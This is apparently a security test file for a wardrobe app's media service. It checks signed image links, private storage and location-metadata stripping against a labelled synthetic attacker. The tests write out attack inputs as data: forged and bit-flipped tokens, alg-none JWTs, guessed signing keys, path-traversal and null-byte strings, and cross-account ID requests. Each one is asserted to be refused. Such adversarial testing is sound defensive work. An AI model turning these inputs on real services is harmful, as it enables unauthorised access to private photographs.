/*
 * THREAT CLASS 10: signed media URL abuse and media isolation.
 *
 * Everything attacked is the real Worker: the media routes, the visual wardrobe's signing and delivery
 * code, local D1 and the private local R2 bucket. `real` is the owner's imported profile and inventory;
 * `synthetic` is the LABELLED SYNTHETIC second owner, used as the attacker.
 *
 * Stand-ins: the photographs are generated test images (`testPng`, and a JPEG encoded from it with the
 * product's own codec and an Exif GPS pointer spliced in, as a phone camera writes); sign-in is a
 * test-signed Access assertion; the conversation model in one test is the labelled FAKE MODEL. There is
 * no Cloudflare Images binding locally, so on-demand thumbnail resizing is not exercised: a width is
 * accepted and the stored rendition is served.
 */
import { SELF } from "cloudflare:test";
import { beforeAll, describe, expect, it } from "vitest";
import { decodeImage, encodeJpeg, probeImage } from "@garderobe/media/image";
import {
  APP_ORIGIN,
  MCP_ORIGIN,
  bindings,
  connectMcp,
  createWorld,
  defect,
  enableFakeModel,
  errorOf,
  inventory,
  provisionOwner,
  runCron,
  seedSynthetic,
  settleRun,
  sha256,
  sql,
  submit,
  testPng,
  toolResult,
  uploadImage,
  SYNTHETIC_WARDROBE,
  type McpConnection,
  type TestOwner,
  type World,
} from "../src/harness.ts";
import { base64Url, containsBytes, encoder, forgeToken, fromBase64Url, mediaKeys, pause, renditionsOf, settleMedia, type RenditionRow } from "../src/data-helpers.ts";

const CSP = "default-src 'none'; sandbox";
const EXIF_MARKER = new Uint8Array([0x45, 0x78, 0x69, 0x66, 0, 0]); // "Exif\0\0"

let world: World;
let victim: TestOwner;
let attacker: TestOwner;
let garmentId: string;
let secondGarmentId: string;
let photo: Uint8Array; // SYNTHETIC TEST IMAGE with an Exif GPS pointer
let assetId: string;
let original: RenditionRow;
let display: RenditionRow;
let attackerAssetId: string;
let attackerDisplay: RenditionRow;
let attackerGarmentId: string;
let shortLived: { url: string; expiresAt: string };
let victimMcp: McpConnection;
let attackerMcp: McpConnection;

/** A JPEG carrying an Exif block with a GPS pointer (SYNTHETIC TEST IMAGE; no real photograph or place). */
async function gpsJpeg(size = 160): Promise<Uint8Array> {
  const { raster } = await decodeImage(testPng(size, size));
  const jpg = encodeJpeg(raster, 90);
  const tiff = new Uint8Array(8 + 2 + 12 + 4 + 6);
  const v = new DataView(tiff.buffer);
  tiff.set([0x49, 0x49, 42, 0, 8, 0, 0, 0]);
  v.setUint16(8, 1, true);
  v.setUint16(10, 0x8825, true);
  v.setUint16(12, 4, true);
  v.setUint32(14, 1, true);
  v.setUint32(18, 26, true);
  const body = new Uint8Array([...EXIF_MARKER, ...tiff]);
  return new Uint8Array([...jpg.subarray(0, 2), 0xff, 0xe1, (body.length + 2) >> 8, (body.length + 2) & 0xff, ...body, ...jpg.subarray(2)]);
}

const tokenOf = (url: string): string => url.split("/").at(-1)!;
const signed = (token: string, origin: string = APP_ORIGIN): Promise<Response> => SELF.fetch(`${origin}/v1/media/signed/${token}`);
const sign = (owner: TestOwner, renditionId: string, body: Record<string, unknown> = {}): Promise<Response> => owner.api.post(`/v1/media/renditions/${renditionId}/sign`, body);
const bytesOf = async (response: Response): Promise<Uint8Array> => new Uint8Array(await response.arrayBuffer());

/** What a refusal of a signed URL looks like to its holder: everything that could tell two failures apart. */
async function denial(response: Response): Promise<string> {
  return JSON.stringify({ status: response.status, type: response.headers.get("content-type"), cache: response.headers.get("cache-control"), etag: response.headers.get("etag"), length: response.headers.get("content-length"), body: await response.text() });
}
let plainDenial: string;

/** No private image may be stored by a shared cache. */
function expectPrivate(response: Response, what: string): void {
  const cache = response.headers.get("cache-control") ?? "";
  expect(cache, `${what}: cache-control`).not.toMatch(/public|s-maxage/i);
  expect(cache, `${what}: cache-control`).toMatch(/private|no-store/i);
  expect(response.headers.get("content-security-policy"), `${what}: CSP`).toBe(CSP);
  expect(response.headers.get("x-content-type-options"), `${what}: nosniff`).toBe("nosniff");
}

const staged = async (owner: TestOwner, uploadId: string): Promise<boolean> => (await bindings().MEDIA_BUCKET!.head(`u/${owner.userId}/staging/${uploadId}`)) !== null;

async function authorize(owner: TestOwner, input: Record<string, unknown>): Promise<any> {
  return owner.api.json("POST", "/v1/uploads", { clientUploadId: `adv-upload-${crypto.randomUUID()}`, intent: "attachment", contentType: "image/png", ...input });
}

const put = (url: string, bytes: Uint8Array | string, headers: Record<string, string>, origin: string = APP_ORIGIN): Promise<Response> => SELF.fetch(`${origin}${url}`, { method: "PUT", headers, body: bytes as BodyInit });

beforeAll(async () => {
  world = await createWorld();
  victim = world.real;
  attacker = world.synthetic;
  const owned = (await inventory(victim)).items.filter((i) => i.garment.acquisition === "owned" && i.garment.roles.includes("top"));
  garmentId = owned[0]!.garment.garmentId;
  secondGarmentId = owned[1]!.garment.garmentId;

  photo = await gpsJpeg();
  const up = await uploadImage(victim, { garmentId, bytes: photo, contentType: "image/jpeg" });
  assetId = up.complete.asset.assetId;
  await settleMedia(victim, assetId);
  const renditions = await renditionsOf(victim, assetId);
  original = renditions.find((r) => r.kind === "original")!;
  display = renditions.find((r) => r.kind !== "original" && r.status === "active")!;

  attackerGarmentId = SYNTHETIC_WARDROBE[0]!.id;
  const theirs = await uploadImage(attacker, { garmentId: attackerGarmentId, bytes: testPng(128, 128) });
  attackerAssetId = theirs.complete.asset.assetId;
  await settleMedia(attacker, attackerAssetId);
  attackerDisplay = (await renditionsOf(attacker, attackerAssetId)).find((r) => r.kind !== "original" && r.status === "active")!;

  // The shortest lifetime the route accepts; a later test waits for it to lapse.
  shortLived = await victim.api.json("POST", `/v1/media/renditions/${display.rendition_id}/sign`, { ttlSeconds: 30 });
  plainDenial = await denial(await signed("not-a-token"));

  victimMcp = await connectMcp(victim, { write: true, clientName: "Owner's assistant (adversarial media test)" });
  attackerMcp = await connectMcp(attacker, { write: true, clientName: "Attacker assistant (synthetic owner)" });
});

describe("fixture: the photograph under attack is real stored state", () => {
  it("the original carries the GPS pointer, a derived copy exists, and both are private objects of the owner", async () => {
    expect(probeImage(photo)!.exif.hasGps).toBe(true);
    expect(original).toBeTruthy();
    expect(display, "a derived rendition was produced by the real pipeline").toBeTruthy();
    expect(original.sha256).toBe(await sha256(photo));
    expect((await sql("SELECT had_location_metadata FROM media_assets WHERE user_id = ? AND asset_id = ?", victim.userId, assetId))[0]!.had_location_metadata).toBe(1);
    for (const r of [original, display]) expect(r.object_key.startsWith(`u/${victim.userId}/`)).toBe(true);
    expect(attackerDisplay).toBeTruthy();
    expect(JSON.parse(plainDenial).status).toBe(404);
  });
});

describe("signing a rendition", () => {
  it("gives the owner a short-lived URL for a derived copy: an image, private, sandboxed, with no metadata", async () => {
    const response = await sign(victim, display.rendition_id, { ttlSeconds: 120 });
    expect(response.status).toBe(200);
    const body = (await response.json()) as any;
    expect(body.url).toMatch(/^\/v1\/media\/signed\/[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/);
    expect(body.renditionId).toBe(display.rendition_id);
    const lifetime = Date.parse(body.expiresAt) - Date.now();
    expect(lifetime).toBeGreaterThan(0);
    expect(lifetime).toBeLessThanOrEqual(120_000);

    const served = await signed(tokenOf(body.url)); // no session: the token is the whole authority
    expect(served.status).toBe(200);
    expect(served.headers.get("content-type")).toMatch(/^image\/(jpeg|png|webp)$/);
    expectPrivate(served, "signed URL");
    const bytes = await bytesOf(served);
    expect(await sha256(bytes)).toBe(display.sha256);
    expect(await sha256(bytes)).not.toBe(original.sha256);
    expect(probeImage(bytes)!.exif).toEqual({ present: false, orientation: null, hasGps: false });
    expect(containsBytes(bytes, EXIF_MARKER)).toBe(false);
    // The URL names no storage location and no owner in clear.
    expect(body.url).not.toContain(victim.userId);
    expect(JSON.stringify(body)).not.toContain("u/");
    expect(JSON.stringify(body)).not.toContain(display.object_key);
  });

  it("bounds the lifetime: a day-long or unbounded link is refused, and the longest link is minutes", async () => {
    for (const ttlSeconds of [86_400, 3601, 1e12, -5, 0, 1, 29.5, "900", null]) {
      const response = await sign(victim, display.rendition_id, { ttlSeconds });
      expect(response.status, `ttlSeconds ${String(ttlSeconds)}`).toBe(400);
      expect(JSON.stringify(await response.json())).not.toContain("/v1/media/signed/");
    }
    const longest = await victim.api.json("POST", `/v1/media/renditions/${display.rendition_id}/sign`, { ttlSeconds: 3600 });
    expect(Date.parse(longest.expiresAt) - Date.now()).toBeLessThanOrEqual(3600_000);
    const byDefault = await victim.api.json("POST", `/v1/media/renditions/${display.rendition_id}/sign`, {});
    expect(Date.parse(byDefault.expiresAt) - Date.now()).toBeLessThanOrEqual(15 * 60_000);
    // Widths are a fixed list: an arbitrary resize cannot be asked for.
    for (const width of [1, 333, 100_000, -160]) expect((await sign(victim, display.rendition_id, { width })).status, `width ${width}`).toBe(400);
  });

  it("refuses to sign another owner's rendition: 404, no token, the same answer as for an ID that does not exist", async () => {
    const missing = await sign(attacker, "rnd_000000000000000000000000");
    const missingBody = await missing.text();
    expect(missing.status).toBe(404);
    for (const id of [display.rendition_id, original.rendition_id]) {
      const response = await sign(attacker, id, { ttlSeconds: 900 });
      const text = await response.text();
      expect(response.status).toBe(404);
      expect(text).toBe(missingBody);
      expect(text).not.toContain("/v1/media/signed/");
      expect(text).not.toContain(victim.userId);
    }
    // The attacker's own rendition is signed for the attacker only, and serves the attacker's image only.
    const own = await attacker.api.json("POST", `/v1/media/renditions/${attackerDisplay.rendition_id}/sign`, {});
    const served = await bytesOf(await signed(tokenOf(own.url)));
    expect(await sha256(served)).toBe(attackerDisplay.sha256);
    expect(await sha256(served)).not.toBe(display.sha256);
  });

  it("[fixed D10-1] a link minted for the ORIGINAL photograph never serves the photograph as supplied or its GPS metadata: it serves a location-free copy, or it is refused like any other link", async () => {
    const response = await sign(victim, original.rendition_id, { ttlSeconds: 900 });
    if (response.status === 200) {
      const { url } = (await response.json()) as { url: string };
      const served = await signed(tokenOf(url));
      // A minted link is either honoured with a location-free copy or refused exactly like every other refused link (the
      // signed route's uniform 404). A server error, or any other answer, is neither.
      expect([200, 404], `the minted link for the original answered ${served.status}`).toContain(served.status);
      if (served.status === 200) {
        expect(served.headers.get("content-type"), "the linked bytes are served as an image").toMatch(/^image\/(jpeg|png|webp)$/);
        const bytes = await bytesOf(served);
        const probe = probeImage(bytes);
        expect(probe, "the linked bytes are an image").not.toBeNull();
        // Whatever a link serves must be a derived copy: not the supplied bytes, and no location metadata.
        expect(await sha256(bytes), "the link serves the photograph exactly as supplied").not.toBe(original.sha256);
        expect(probe!.exif.hasGps, "the linked image carries the GPS pointer").toBe(false);
      } else {
        expect(await denial(served), "a minted link that is not honoured is refused like any other link").toBe(plainDenial);
      }
    } else {
      expect([403, 404]).toContain(response.status);
    }
  });
});

describe("forged and altered tokens: every one is the same 404", () => {
  let token: string;
  let payload: string;
  let mac: string;
  let claims: { p: string; u: string; r: string; w: number; exp: number };

  beforeAll(async () => {
    token = tokenOf((await victim.api.json("POST", `/v1/media/renditions/${display.rendition_id}/sign`, { ttlSeconds: 600 })).url);
    [payload, mac] = token.split(".") as [string, string];
    claims = JSON.parse(new TextDecoder().decode(fromBase64Url(payload)));
  });

  const expectDenied = async (candidate: string, what: string): Promise<void> => {
    const response = await signed(encodeURIComponent(candidate));
    expect(await denial(response), what).toBe(plainDenial);
  };

  it("the genuine token works (so the refusals below are refusals of the change, not of the request)", async () => {
    expect(claims).toMatchObject({ p: "rendition", u: victim.userId, r: display.rendition_id });
    expect((await signed(token)).status).toBe(200);
    // The forging helper builds the product's exact wire form: with the real key (read from the test bindings) it is accepted.
    const genuine = await forgeToken(bindings().MEDIA_SIGNING_KEY!, { ...claims });
    expect((await signed(genuine)).status).toBe(200);
  });

  it("bit flips, truncation and extension", async () => {
    const flip = (text: string, at: number) => `${text.slice(0, at)}${text[at] === "A" ? "B" : "A"}${text.slice(at + 1)}`;
    const candidates: [string, string][] = [];
    for (const at of [0, 5, Math.floor(payload.length / 2), payload.length - 1]) candidates.push([`${flip(payload, at)}.${mac}`, `payload character ${at} flipped`]);
    for (const at of [0, 7, Math.floor(mac.length / 2), mac.length - 2]) candidates.push([`${payload}.${flip(mac, at)}`, `signature character ${at} flipped`]);
    candidates.push([token.slice(0, -1), "last character removed"], [token.slice(0, -10), "ten characters removed"], [payload, "signature removed"], [`${payload}.`, "empty signature"], [`.${mac}`, "empty payload"]);
    candidates.push([`${token}A`, "one character appended"], [`${token}.${mac}`, "signature repeated"], [`${token}=`, "padding appended"], [` ${token}`, "leading space"], [`${token}\n`, "trailing newline"]);
    candidates.push([token.toUpperCase(), "upper-cased"], [`${payload}.${mac.slice(0, 22)}`, "half a signature"], [`${payload}.${"A".repeat(43)}`, "zero signature"], ["A".repeat(5000), "an oversized token"]);
    for (const [candidate, what] of candidates) await expectDenied(candidate, what);
  });

  it("a payload re-signed with a guessed key, or with another secret of the same deployment", async () => {
    const wanted = { p: "rendition", u: victim.userId, r: original.rendition_id, w: 0, exp: Math.floor(Date.now() / 1000) + 3600 };
    const env = bindings() as unknown as Record<string, string>;
    const guesses = ["secret", "garderobe", "changeme", "MEDIA_SIGNING_KEY", "0".repeat(32), "a".repeat(48), "test-media-signing-key-0123456789abcdef", victim.userId, attacker.userId, APP_ORIGIN, env.ACCESS_AUD!, env.STATE_SIGNING_KEY!, env.CREDENTIAL_KEY!, env.GOOGLE_OAUTH_CLIENT_SECRET!, payload, mac];
    for (const [index, guess] of guesses.entries()) await expectDenied(await forgeToken(guess, wanted), `guessed key #${index}`);
  });

  it("changed claims under the genuine signature: another rendition, another owner, a later expiry, another width", async () => {
    const reencode = (change: Record<string, unknown>) => `${base64Url(encoder.encode(JSON.stringify({ ...claims, ...change })))}.${mac}`;
    await expectDenied(reencode({ r: original.rendition_id }), "rendition changed to the original");
    await expectDenied(reencode({ r: attackerDisplay.rendition_id }), "rendition changed to another owner's");
    await expectDenied(reencode({ u: attacker.userId }), "owner changed");
    await expectDenied(reencode({ exp: claims.exp + 86_400 }), "expiry extended");
    await expectDenied(reencode({ exp: 9_999_999_999 }), "expiry far in the future");
    await expectDenied(reencode({ w: 1280 }), "width changed");
    await expectDenied(reencode({ p: "composite" }), "purpose changed");
    await expectDenied(reencode({ aud: "calendar" }), "an audience added");
    // The attacker's own genuine token, with the victim's rendition written into it.
    const own = tokenOf((await attacker.api.json("POST", `/v1/media/renditions/${attackerDisplay.rendition_id}/sign`, {})).url);
    const [ownPayload, ownMac] = own.split(".") as [string, string];
    const ownClaims = JSON.parse(new TextDecoder().decode(fromBase64Url(ownPayload)));
    await expectDenied(`${base64Url(encoder.encode(JSON.stringify({ ...ownClaims, u: victim.userId, r: display.rendition_id })))}.${ownMac}`, "attacker's signature over the victim's rendition");
    await expectDenied(`${payload}.${ownMac}`, "victim's payload under the attacker's signature");
  });

  it("unsigned and 'alg: none' style tokens", async () => {
    const header = base64Url(encoder.encode(JSON.stringify({ alg: "none", typ: "JWT" })));
    const hs = base64Url(encoder.encode(JSON.stringify({ alg: "HS256", typ: "JWT" })));
    const body = base64Url(encoder.encode(JSON.stringify({ ...claims, r: original.rendition_id, exp: 9_999_999_999, alg: "none" })));
    for (const [candidate, what] of [
      [`${header}.${body}.`, "JWT with alg none"],
      [`${header}.${body}`, "alg-none header as the payload"],
      [`${hs}.${body}.${mac}`, "three-part JWT with the genuine signature"],
      [`${body}.`, "claims with an empty signature"],
      [`${body}.none`, "signature 'none'"],
      [`${body}.null`, "signature 'null'"],
      [body, "claims alone"],
      [`${body}.${base64Url(new Uint8Array(32))}`, "an all-zero signature"],
    ] as const) await expectDenied(candidate, what);
  });

  it("a token of another purpose: an upload authorization opens no image, and an image link uploads nothing", async () => {
    const upload = await authorize(victim, { byteLength: testPng().length });
    const uploadToken = new URL(`${APP_ORIGIN}${upload.url}`).searchParams.get("token")!;
    await expectDenied(uploadToken, "an upload token used as an image link");
    const response = await put(`/v1/uploads/${upload.uploadId}/content?token=${token}`, testPng(), { "content-type": "image/png" });
    expect(response.status).toBe(403);
    expect(await staged(victim, upload.uploadId)).toBe(false);
    // The rendition's own ID in place of the upload ID changes nothing.
    expect((await put(`/v1/uploads/${display.rendition_id}/content?token=${token}`, testPng(), { "content-type": "image/png" })).status).toBe(403);
  });

  it("odd tokens: traversal, encodings and control characters never serve anything and never fail open", async () => {
    for (const raw of ["..%2F..%2Fv1%2Fwardrobe", "%2e%2e%2f%2e%2e", "%00", `${token}%00`, `${payload}%2E${mac}%2Fextra`, "%F0%9F%91%95.%F0%9F%91%95", `${encodeURIComponent(token)}%3Fwidth%3D160`, "null", "undefined", `${"A".repeat(20)}.${"A".repeat(43)}`]) {
      const response = await SELF.fetch(`${APP_ORIGIN}/v1/media/signed/${raw}`);
      expect(await denial(response), raw).toBe(plainDenial);
    }
    // A token with a path separator or a broken escape matches no route at all: still a 404 with no image.
    for (const raw of [`${payload}/${mac}`, `${token}/..`, "%zz", `${token}/`]) {
      const response = await SELF.fetch(`${APP_ORIGIN}/v1/media/signed/${raw}`);
      expect(response.status, raw).toBe(404);
      expect(response.headers.get("content-type") ?? "", raw).not.toMatch(/^image\//);
    }
  });
});

describe("a link stops working when what it names is gone", () => {
  it("after the photograph was deleted, and after it was replaced by another one", async () => {
    const first = await uploadImage(victim, { garmentId: secondGarmentId, bytes: testPng(120, 120) });
    const firstAsset = first.complete.asset.assetId as string;
    await settleMedia(victim, firstAsset);
    const before = await renditionsOf(victim, firstAsset);
    const links: string[] = [];
    for (const r of before.filter((x) => x.kind !== "original")) links.push(tokenOf((await victim.api.json("POST", `/v1/media/renditions/${r.rendition_id}/sign`, { ttlSeconds: 900 })).url));
    expect(links.length).toBeGreaterThan(0);
    for (const link of links) expect((await signed(link)).status).toBe(200);

    const deleted = await submit(victim, "media.delete_asset", { assetId: firstAsset });
    expect(deleted.status, JSON.stringify(deleted.error)).toBe(200);
    for (const link of links) expect(await denial(await signed(link)), "link to a deleted image").toBe(plainDenial);
    // The authenticated routes agree: the image is gone for the owner too, and no new link can be made.
    for (const r of before) {
      expect((await victim.api.get(`/v1/media/renditions/${r.rendition_id}`)).status).toBe(404);
      expect((await sign(victim, r.rendition_id)).status).toBe(404);
    }
    expect((await victim.api.get(`/v1/media/assets/${firstAsset}`)).status).toBe(404);

    // The replacement: a new photograph of the same garment. Old links stay dead; the garment shows the new image only.
    const replacement = testPng(140, 140);
    const second = await uploadImage(victim, { garmentId: secondGarmentId, bytes: replacement });
    await settleMedia(victim, second.complete.asset.assetId);
    for (const link of links) expect(await denial(await signed(link)), "old link after the replacement").toBe(plainDenial);
    const shown = await victim.api.get(`/v1/items/${secondGarmentId}/image`);
    expect(shown.status).toBe(200);
    const current = await renditionsOf(victim, second.complete.asset.assetId);
    expect(current.map((r) => r.sha256)).toContain(await sha256(await bytesOf(shown)));
    expect(before.map((r) => r.sha256)).not.toContain(current.find((r) => r.kind === "original")!.sha256);

    // After the scheduled purge the deleted image's bytes are gone from the private bucket as well.
    for (let i = 0; i < 3; i++) await runCron();
    expect(await mediaKeys(`u/${victim.userId}/assets/${firstAsset}/`)).toEqual([]);
  });

  it("after the account was deleted: the link is the same 404 and the bytes are erased from storage", async () => {
    const doomed = await provisionOwner({ displayName: "SYNTHETIC owner to be deleted (adversarial media test)" });
    await seedSynthetic(doomed, SYNTHETIC_WARDROBE.slice(0, 1));
    const up = await uploadImage(doomed, { garmentId: SYNTHETIC_WARDROBE[0]!.id, bytes: testPng(100, 100) });
    await settleMedia(doomed, up.complete.asset.assetId);
    const rendition = (await renditionsOf(doomed, up.complete.asset.assetId)).find((r) => r.kind !== "original")!;
    const link = tokenOf((await doomed.api.json("POST", `/v1/media/renditions/${rendition.rendition_id}/sign`, { ttlSeconds: 900 })).url);
    expect((await signed(link)).status).toBe(200);
    expect((await mediaKeys(`u/${doomed.userId}/`)).length).toBeGreaterThan(0);

    const asked = await doomed.api.json("POST", "/v1/account/delete", {});
    // Asking is not deleting: the link still works until the owner confirms.
    expect((await signed(link)).status).toBe(200);
    const confirmed = await doomed.api.json("POST", "/v1/account/delete", { confirmationToken: asked.confirmationToken });
    expect(["erased", "disabled_pending_deletion"]).toContain(confirmed.state);
    expect(await denial(await signed(link)), "link of a deleted account").toBe(plainDenial);
    expect(await denial(await signed(link, MCP_ORIGIN)), "link of a deleted account on the MCP hostname").not.toContain('"status":200');
    for (let i = 0; i < 3 && (await mediaKeys(`u/${doomed.userId}/`)).length > 0; i++) await runCron();
    expect(await mediaKeys(`u/${doomed.userId}/`)).toEqual([]);
    expect(await sql("SELECT 1 FROM media_renditions WHERE user_id = ?", doomed.userId)).toEqual([]);
  });

  it("after it expired", async () => {
    const remaining = Date.parse(shortLived.expiresAt) - Date.now();
    expect(remaining).toBeLessThanOrEqual(30_000);
    if (remaining > -1500) await pause(remaining + 1500);
    expect(await denial(await signed(tokenOf(shortLived.url))), "expired link").toBe(plainDenial);
    // The image itself still exists: only the link lapsed.
    expect((await victim.api.get(`/v1/media/renditions/${display.rendition_id}`)).status).toBe(200);
  });
});

describe("hostname separation", () => {
  it("[fixed D10-2] token-authenticated media routes (signed image link, upload target) are served on the app hostname only, not on the MCP hostname", async () => {
    const link = tokenOf((await victim.api.json("POST", `/v1/media/renditions/${display.rendition_id}/sign`, {})).url);
    const upload = await authorize(victim, { byteLength: testPng().length });
    const onMcp = await signed(link, MCP_ORIGIN);
    const uploaded = await put(upload.url, testPng(), { "content-type": "image/png" }, MCP_ORIGIN);
    const outcome = { signedImage: onMcp.status, signedImageType: onMcp.headers.get("content-type"), uploadPut: uploaded.status, staged: await staged(victim, upload.uploadId) };
    // The MCP hostname serves the MCP transport and its OAuth endpoints, nothing of the app's API.
    expect(outcome.signedImage, JSON.stringify(outcome)).not.toBe(200);
    expect(outcome.uploadPut, JSON.stringify(outcome)).toBeGreaterThanOrEqual(400);
    expect(outcome.staged, JSON.stringify(outcome)).toBe(false);
  });

  it("an assistant's MCP token opens no media route on either hostname, and signs nothing", async () => {
    for (const mcp of [victimMcp, attackerMcp]) {
      const token = mcp.oauth.snapshot().accessToken;
      for (const origin of [APP_ORIGIN, MCP_ORIGIN]) {
        const calls: [string, string, BodyInit | undefined][] = [
          ["GET", `/v1/media/renditions/${display.rendition_id}`, undefined],
          ["GET", `/v1/media/renditions/${original.rendition_id}`, undefined],
          ["GET", `/v1/media/assets/${assetId}?variant=original`, undefined],
          ["GET", `/v1/items/${garmentId}/image`, undefined],
          ["GET", "/v1/media/review", undefined],
          ["POST", `/v1/media/renditions/${display.rendition_id}/sign`, "{}"],
          ["POST", "/v1/uploads", JSON.stringify({ clientUploadId: `adv-${crypto.randomUUID()}`, intent: "attachment", contentType: "image/png", byteLength: 1000 })],
        ];
        for (const [method, path, body] of calls) {
          const response = await SELF.fetch(`${origin}${path}`, { method, headers: { Authorization: `Bearer ${token}`, "Cf-Access-Jwt-Assertion": token, "Content-Type": "application/json" }, ...(body ? { body } : {}) });
          const text = await response.text();
          expect(response.status, `${method} ${origin}${path}`).toBe(401);
          expect(response.headers.get("content-type") ?? "").not.toMatch(/^image\//);
          expect(text).not.toContain("/v1/media/signed/");
          expect(text).not.toContain("token=");
        }
      }
    }
  });
});

describe("the original stays with the owner in the app", () => {
  it("the owner's own authenticated read is private and sandboxed; an assistant's turn receives a derived copy without metadata", async () => {
    const mine = await victim.api.get(`/v1/media/assets/${assetId}?variant=original`);
    expect(mine.status).toBe(200);
    expectPrivate(mine, "owner's read of the original");
    // The coordinator's ruling on D10-1: location metadata is removed by default, and an original WITH its location needs the
    // owner's explicit opt-in, which this read does not give (the owner's read route offers no such option). So the owner's
    // read is the photograph without its metadata, not the bytes as supplied: delivery reads the original through
    // `withoutLocation` (packages/media/src/delivery.ts, readRendition; packages/media/src/image/location.ts), which rewrites a
    // JPEG losslessly, copying its image data as it is. The recorded sha256 in D1 (media_renditions.sha256, checked in the
    // fixture test) describes the STORED original, which is kept exactly as supplied; the served copy has no recorded hash, so
    // the served bytes are held to the stored original by format, dimensions and decoded pixels instead.
    const mineBytes = await bytesOf(mine);
    expect(mine.headers.get("content-type"), "the owner's read is served as the photograph's own type").toBe("image/jpeg");
    const mineProbe = probeImage(mineBytes);
    const suppliedProbe = probeImage(photo)!;
    expect(mineProbe, "the owner's read is an image").not.toBeNull();
    expect({ format: mineProbe!.format, width: mineProbe!.width, height: mineProbe!.height }, "the same image format and dimensions as the upload").toEqual({ format: suppliedProbe.format, width: suppliedProbe.width, height: suppliedProbe.height });
    expect(mineProbe!.exif, "the owner's read carries Exif metadata or the GPS pointer").toEqual({ present: false, orientation: null, hasGps: false });
    expect(containsBytes(mineBytes, EXIF_MARKER), "the owner's read carries an Exif block").toBe(false);
    expect(await sha256(mineBytes), "the owner's read is the photograph exactly as supplied, location data included").not.toBe(original.sha256);
    // Lossless: the same pixels as the upload, decoded by the product's own codec.
    const pixels = async (bytes: Uint8Array): Promise<string> => {
      const { raster } = await decodeImage(bytes);
      return sha256(new Uint8Array(raster.data.buffer, raster.data.byteOffset, raster.data.byteLength));
    };
    expect(await pixels(mineBytes), "the owner's read decodes to the same pixels as the upload").toBe(await pixels(photo));
    // The stored original is the upload exactly as supplied, and it is what the asset's recorded sha256 in D1 describes.
    const stored = await bindings().MEDIA_BUCKET!.get(original.object_key);
    expect(stored, "the original is stored").not.toBeNull();
    expect(await sha256(new Uint8Array(await stored!.arrayBuffer())), "the stored original matches its recorded sha256").toBe(original.sha256);

    // The conversation assistant (FAKE MODEL at the model boundary) is shown the photograph by the real image port.
    const model = await enableFakeModel(victim);
    model.script({ text: "SCRIPTED FAKE MODEL REPLY: a photograph of a top." });
    const turn = await victim.api.json("POST", "/v1/conversation/turns", { clientTurnId: `adv-media-turn-${crypto.randomUUID()}`, text: "What is in this picture?", attachmentIds: [assetId], imageRoles: { [assetId]: "item_photo" } });
    const run = await settleRun(victim, turn.runId);
    expect(run.state, JSON.stringify(run.error)).toBe("completed");
    const request = model.requests.at(-1)!;
    expect(request.images.length, "the model was shown the attached photograph").toBeGreaterThan(0);
    const parts: Uint8Array[] = [];
    for (const message of request.raw.prompt as any[]) {
      if (!Array.isArray(message.content)) continue;
      for (const part of message.content) {
        if (part?.type !== "file") continue;
        const data = part.data?.data ?? part.data;
        if (data instanceof Uint8Array) parts.push(data);
        else if (typeof data === "string") parts.push(Uint8Array.from(atob(data.replace(/^data:[^,]+,/, "")), (c) => c.charCodeAt(0)));
        else if (data instanceof URL) throw new Error(`the model was handed a URL to the image: ${data.host}`);
      }
    }
    expect(parts.length).toBeGreaterThan(0);
    for (const bytes of parts) {
      // A real image, not arbitrary bytes: it is recognised and decodes to a picture with pixels.
      expect(probeImage(bytes), "the model's copy is an image").not.toBeNull();
      const decoded = await decodeImage(bytes);
      expect(decoded.raster.width * decoded.raster.height, "the model's copy decodes to a picture").toBeGreaterThan(0);
      expect(await sha256(bytes), "the model received the photograph exactly as supplied").not.toBe(original.sha256);
      expect(containsBytes(bytes, EXIF_MARKER), "the model's copy carries an Exif block").toBe(false);
      expect(probeImage(bytes)!.exif.hasGps).toBe(false);
    }
    // Nothing in the text the model received names where the image is stored.
    const context = JSON.stringify(request.messages) + request.system;
    expect(context).not.toContain(`u/${victim.userId}/`);
    expect(context).not.toContain("/v1/media/signed/");
  });

  defect("D10-3", "a connected assistant gets image bytes, a storage location or a link over MCP, or can be authorized to upload", async () => {
    const texts: string[] = [];
    for (const args of [{ view: "item", garmentId }, { view: "snapshot" }, { view: "items", limit: 5 }] as Record<string, unknown>[]) {
      const result = await victimMcp.client.callTool({ name: "garderobe_inventory", arguments: args });
      texts.push(JSON.stringify(result));
      for (const block of (result.content as { type: string }[] | undefined) ?? []) expect(["text", "resource_link"]).toContain(block.type);
    }
    const resources = await victimMcp.client.listResources();
    for (const resource of resources.resources) texts.push(JSON.stringify(await victimMcp.client.readResource({ uri: resource.uri })));
    const everything = texts.join("\n");
    expect(everything).not.toContain(`u/${victim.userId}/`);
    expect(everything).not.toContain(original.object_key);
    expect(everything).not.toContain("/v1/media/signed/");
    expect(everything).not.toMatch(/"type":"image"/);
    expect(everything).not.toContain(bindings().MEDIA_SIGNING_KEY!);

    // Asking for an upload authorization as a typed command: nothing is authorized and no upload token is returned.
    const uploadsBefore = (await sql("SELECT COUNT(*) AS n FROM media_uploads WHERE user_id = ?", victim.userId))[0]!.n;
    for (const mcp of [victimMcp, attackerMcp]) {
      const result = await mcp.client.callTool({ name: "garderobe_command", arguments: { type: "media.authorize_upload", payload: { intent: "garment_photo", garmentId, contentType: "image/png", byteLength: 2000 }, idempotencyKey: `adv-mcp-upload-${crypto.randomUUID()}` } });
      const parsed = toolResult(result);
      expect(parsed.ok).toBe(false);
      expect(JSON.stringify(result)).not.toMatch(/token=|\/v1\/uploads\/[^"]+\/content/);
    }
    for (const type of ["media.finalize_upload", "media.record_normalization", "media.import_records", "media.reapply_deletions"]) {
      const parsed = toolResult(await attackerMcp.client.callTool({ name: "garderobe_command", arguments: { type, payload: { uploadId: "upl_x", assetId, part: "assets", rows: {}, assetIds: [assetId], purgedOriginalAssetIds: [] }, idempotencyKey: `adv-mcp-media-${crypto.randomUUID()}` } }));
      expect(parsed.ok, type).toBe(false);
    }
    expect((await sql("SELECT COUNT(*) AS n FROM media_uploads WHERE user_id = ?", victim.userId))[0]!.n).toBe(uploadsBefore);
    expect((await sql("SELECT status FROM media_assets WHERE user_id = ? AND asset_id = ?", victim.userId, assetId))[0]!.status).toBe("active");
  });
});

describe("another owner's identifiers, traversal and odd IDs on the authenticated media routes", () => {
  it("the attacker reads nothing of the victim's by ID: renditions, assets, garment images, uploads, review", async () => {
    const upload = await authorize(victim, { byteLength: testPng().length });
    const paths = [
      `/v1/media/renditions/${display.rendition_id}`,
      `/v1/media/renditions/${original.rendition_id}`,
      `/v1/media/renditions/${display.rendition_id}?width=160`,
      `/v1/media/assets/${assetId}`,
